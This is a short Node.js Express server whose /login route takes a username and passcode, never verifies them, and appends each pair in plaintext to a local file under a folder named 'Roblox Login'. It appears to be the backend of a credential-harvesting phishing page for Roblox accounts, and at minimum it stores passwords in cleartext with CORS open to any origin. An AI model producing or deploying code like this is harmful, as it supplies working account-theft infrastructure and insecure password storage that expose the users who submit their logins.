const express = require("express");
const fs = require("fs");
const cors = require("cors");

const app = express();
const PORT = process.env.PORT || 3000;

// JSON file path
const filePath = "C:/Users/liddo/Roblox Login/accounts.json";

// ============================
// Middleware
// ============================
app.use(express.json()); // Parse JSON for POST requests
app.use(express.urlencoded({ extended: true })); // Parse form submissions
app.use(cors()); // Allows frontend to connect from any origin

// Serve static files from 'public' folder
app.use(express.static("public"));

// ============================
// POST /login route
// ============================
app.post("/login", (req, res) => {
  const { username, passcode } = req.body;

  if (!username || !passcode) {
    return res.status(400).json({ message: "Please enter both username and passcode." });
  }

  let accounts = {};

  // Load existing accounts if file exists
  if (fs.existsSync(filePath)) {
    const rawData = fs.readFileSync(filePath, "utf8");
    if (rawData) accounts = JSON.parse(rawData);
  }

  // Add or update account
  accounts[username] = passcode;

  // Save back to JSON file
  fs.writeFileSync(filePath, JSON.stringify(accounts, null, 2));

  console.log(`Saved account for ${username}`);
  res.json({ message: `✅ Saved account for ${username}` });
});

// ============================
// Start server
// ============================
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
});
